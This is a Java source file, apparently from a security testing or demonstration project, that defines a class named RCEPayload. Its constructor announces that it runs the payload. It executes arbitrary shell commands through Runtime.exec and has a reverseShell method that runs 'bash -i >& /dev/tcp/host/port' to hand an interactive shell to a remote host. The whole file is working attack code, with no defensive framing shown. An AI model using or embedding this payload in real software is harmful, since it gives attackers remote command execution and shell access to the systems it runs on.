// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

package com.gocortex.payload;

import java.io.*;

public class RCEPayload {
    
    public RCEPayload() {
        System.out.println("[RCEPayload] Constructor called - executing payload");
    }
    
    public String execute() {
        return executeCommand("whoami");
    }
    
    public String executeCommand(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            System.out.println("[RCEPayload] Command executed: " + cmd);
            System.out.println("[RCEPayload] Output: " + output.toString());
            return output.toString();
        } catch (Exception e) {
            String error = "[RCEPayload] Error: " + e.getMessage();
            System.err.println(error);
            return error;
        }
    }
    
    public String reverseShell(String host, int port) {
        try {
            String[] cmd = {"/bin/sh", "-c", "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"};
            Runtime.getRuntime().exec(cmd);
            return "[RCEPayload] Reverse shell initiated to " + host + ":" + port;
        } catch (Exception e) {
            return "[RCEPayload] Reverse shell failed: " + e.getMessage();
        }
    }
}
